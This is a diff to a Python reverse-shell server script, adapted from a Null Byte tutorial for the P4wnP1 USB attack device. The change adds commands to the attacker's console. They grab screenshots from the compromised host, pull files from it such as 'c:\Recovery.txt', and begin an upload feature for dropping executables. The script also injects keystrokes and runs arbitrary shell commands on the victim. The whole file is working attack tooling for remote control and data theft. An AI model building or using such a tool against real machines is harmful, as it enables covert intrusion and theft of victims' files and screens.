@@ -1,10 +1,30 @@
 # nullbyte python server reverse shell
 # source : https://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/
 # Modify by BeBoX 22.01.2019 auto add shell in cmd, corrected some errors
-# Set in FR language
+# 24.01 ver 1.1 add special P4wnP1 features 
 import socket, os, sys, time, subprocess
 def shell(cmd):
     return(subprocess.check_output(cmd, shell = True ))
+def getpic():
+    tailleImage = conn.recv(8)
+    tailleImage = int(tailleImage.decode())
+    contenuTelecharge = 0
+    fichierImage = open("filename.png","wb")
+    while contenuTelecharge < tailleImage:
+        contenuRecu = conn.recv(1024)
+        fichierImage.write(contenuRecu)
+        contenuTelecharge += len(contenuRecu)   
+    fichierImage.close()
+def dwnfile(filename):
+    tailleImage = conn.recv(8)
+    tailleImage = int(tailleImage.decode())
+    contenuTelecharge = 0
+    fichierImage = open(filename,"wb")
+    while contenuTelecharge < tailleImage:
+        contenuRecu = conn.recv(1024)
+        fichierImage.write(contenuRecu)
+        contenuTelecharge += len(contenuRecu)   
+    fichierImage.close()   
 def socketCreate():
     try:
         global host
@@ -38,6 +58,9 @@ def socketAccept():
         print('speed : typing speed slow or fast ex.speed fast')
         print('press : Send key stoke ex.press GUI r')
         print('type  : type somthing on keyboard ex. type hello')
+        print('shot  : get screenshot of host computer')
+        print('dwnld : download a file from host ex.dwnld c:\Recovery.txt')
+        print('upld  : upload a file to host ex.upld client.exe c:\\temp\\')
         print('-help : this text')
         print('quit  : leave and quit reverse shell')
         hostname = conn.recv(1024)
@@ -46,6 +69,7 @@ def socketAccept():
         print('Socket Accepting error: ' + str(msg[0]))
 def menu():
     shell("P4wnP1_cli hid run -c \"press('GUI DOWN')\"")
+    autoreturn = 0
     result = ""
     while 1:
         cmd = raw_input(str(addr[0])+'@'+ str(hostname) + '> ')
@@ -63,6 +87,9 @@ def menu():
             print('speed : typing speed slow or fast ex.speed fast')
             print('press : Send key stoke ex.press GUI r')
             print('type  : type somthing on keyboard ex. type hello')
+            print('shot  : get screenshot of host computer')
+            print('dwnld : download a file from host ex.dwnld c:\Recovery.txt')
+            print('upld  : upload a file to host ex.upld client.exe c:\\temp\\')
             print('-help : this text')
             print('quit  : leave and quit reverse shell')
             result = ''
@@ -80,15 +107,29 @@ def menu():
                 result = "Unknown speed parameter, try fast or slow"
         elif cmd[:5] == 'press':
             shell("P4wnP1_cli hid run -c \"press('%s')\""%(cmd[6:]))
-            result = "Send %s to keyboard"%(cmd[6:])
+            result = "Send %s  to keyboard"%(cmd[6:])
+        elif cmd[:5] == 'dwnld':
+            tmp = cmd.split("\\")
+            if len(tmp) >1:
+                command = conn.send(cmd)
+                dwnfile(tmp[len(tmp)-1])
+                result = 'ok'
+            else:
+                result = "Error, need full path ex. c:\\windows\\system32\\file.sys"
+        elif cmd[:4] == 'upld':
+            print('wip')
         elif cmd[:4] == 'type':
             shell("P4wnP1_cli hid run -c \"type('%s')\""%(cmd[5:]))
             result = "Sent to keyboard"
+        elif cmd == 'shot':
+            command = conn.send(cmd)
+            getpic()
+            result = 'ok'
         else:
             cmd = 'shell '+ cmd #add automaticaly shell before commands if not quit
             command = conn.send(cmd)
             result = conn.recv(16834)
-        if result <> hostname:
+        if result != hostname:
             print(result)
 def main():
     socketCreate()
